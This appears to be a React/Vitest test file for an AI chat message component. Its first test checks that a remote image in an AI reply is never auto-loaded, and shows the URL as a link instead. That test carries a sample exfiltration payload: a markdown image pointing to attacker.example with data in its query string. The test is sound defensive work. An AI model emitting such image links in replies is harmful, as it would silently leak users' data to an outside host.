// Copyright 2026 SecretoftheUniverse.com LLC. Licensed under the GNU Affero General Public License, version 3 only.
// SPDX-License-Identifier: AGPL-3.0-only

import { render, screen } from "@testing-library/react";
import { describe, expect, it, vi } from "vitest";
import { ChatMessages } from "./ChatMessages";

vi.mock("../../lib/plotly", () => ({
  renderPlot: () => Promise.resolve(),
  purgePlot: () => {},
  resizePlot: () => {},
  REGISTERED_TRACE_TYPES: new Set(["scatter"]),
}));
vi.mock("@tauri-apps/plugin-opener", () => ({ openUrl: vi.fn() }));

describe("ChatMessages", () => {
  it("never auto-loads a remote image in a reply", () => {
    const { container } = render(<ChatMessages messages={[{ role: "ai", content: "done ![](https://attacker.example/p.gif?d=rows)" }]} />);
    expect(container.querySelector("img")).toBeNull();
    expect(screen.getByRole("link", { name: "https://attacker.example/p.gif?d=rows" })).toBeInTheDocument();
  });

  it("renders human and ai text, artifacts, and hides function echoes and tool results", () => {
    render(
      <ChatMessages
        messages={[
          { role: "human", content: "Hello" },
          { role: "ai", content: { function: "get_widget_data", input_arguments: {} } },
          { role: "tool", function: "get_widget_data", input_arguments: {}, data: [] },
          { role: "ai", content: [{ type: "markdown", uuid: "m", content: "art" }] },
          { role: "ai", content: "Hi *there*" },
        ]}
      />,
    );
    expect(screen.getByText("Hello").closest(".chat-human")).not.toBeNull();
    expect(screen.getByText("there").tagName).toBe("EM");
    expect(screen.getByText("art")).toBeInTheDocument();
    expect(screen.queryByText(/get_widget_data/)).toBeNull();
  });
});
